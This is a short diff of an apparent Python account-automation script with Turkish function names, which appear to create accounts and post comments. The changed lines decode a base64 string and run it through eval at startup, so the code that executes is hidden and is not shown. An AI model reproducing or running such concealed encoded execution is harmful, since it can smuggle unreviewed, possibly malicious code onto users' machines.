@@ -172,7 +172,8 @@ def yorum_at(app,chatid,messageid):
 """eval(compile(base64.b64decode(myscript),'<string>','exec'))"""
 if __name__ == "__main__":
     logo(True)
-    eval(compile(base64.b64decode(myscript()),'<string>','exec'))
+    myscripts = myscript()
+    eval(compile(base64.b64decode(myscripts),'<string>','exec'))
     hesaplariolustur()
     basarilihesap= hesaplarabaglan()
     if basarilihesap==0:
